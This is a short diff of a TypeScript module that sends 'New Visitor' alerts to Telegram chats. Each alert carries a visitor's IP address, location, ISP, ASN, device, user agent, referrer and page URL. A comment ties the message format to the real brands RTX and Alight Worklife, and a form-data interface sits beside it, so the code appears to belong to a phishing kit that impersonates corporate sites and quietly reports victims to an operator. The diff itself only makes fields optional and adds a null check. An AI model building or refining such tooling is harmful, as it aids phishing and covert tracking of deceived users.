@@ -16,26 +16,24 @@ if (CHAT_IDS.length === 0) {
 }
 
 /** Payload for “New Visitor” Telegram (aligned with RTX / Alight Worklife format). */
-export interface VisitorTelegramData {
-  siteName: string
-  location: string
-  ip: string
-  timezone: string
-  isp: string
+export type VisitorTelegramData = {
+  siteName?: string
+  location?: string
+  ip?: string
+  timezone?: string
+  isp?: string
   asn?: string | null
   org?: string | null
-  /** Parsed OS label from UA, e.g. "iOS 17.2", "Windows 10/11". */
+  localTime?: string
+  utcTime?: string
+  os?: string
   osLabel?: string
-  /** Hardware/class from UA, e.g. "iPhone", "Mac", "Windows PC". */
   deviceLabel?: string
-
-  userAgent: string
-  screen: string
-  language: string
-  referrer: string
-  pageUrl: string
-  localTime: string
-  utcTime: string
+  userAgent?: string
+  screen?: string
+  language?: string
+  referrer?: string
+  pageUrl?: string
 }
 
 interface FormData {
@@ -121,7 +119,7 @@ export async function sendVisitorNotification(data: VisitorTelegramData): Promis
     ? `📱 <b>Device:</b> ${asCode(data.deviceLabel)}\n`
     : ''
   const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
-  const site = escapeTelegramHtml(data.siteName)
+  const site = escapeTelegramHtml(data.siteName ?? "")
   const message =
     `\n🌐 <b>New Visitor (${site})</b>\n` +
     `━━━━━━━━━━━━━━━━━━\n` +
